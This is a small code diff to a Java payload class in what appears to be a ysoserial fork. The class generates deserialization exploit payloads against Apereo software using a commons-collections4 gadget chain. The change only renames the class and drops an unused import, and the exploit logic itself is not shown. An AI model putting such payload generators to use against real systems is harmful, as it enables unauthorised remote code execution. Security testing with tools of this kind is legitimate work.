@@ -6,7 +6,6 @@ import ysoserial.features.GenerateApereo;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.external.Apereo_linux;
 import ysoserial.payloads.external.Apereo_win;
-import ysoserial.payloads.util.Gadgets1;
 import ysoserial.payloads.util.Gadgets2;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
@@ -30,7 +29,7 @@ import java.util.PriorityQueue;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
-public class apereo_CommonsCollections2 implements ObjectPayload<String> {
+public class apereo implements ObjectPayload<String> {
     public String getObject(HashMap<String, String> vars) throws Exception {
         String platform = vars.get("platform");
         Class classpayload = null;
@@ -68,7 +67,7 @@ public class apereo_CommonsCollections2 implements ObjectPayload<String> {
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(apereo_CommonsCollections2.class, args);
+        PayloadRunner.run(apereo.class, args);
     }
 
 }
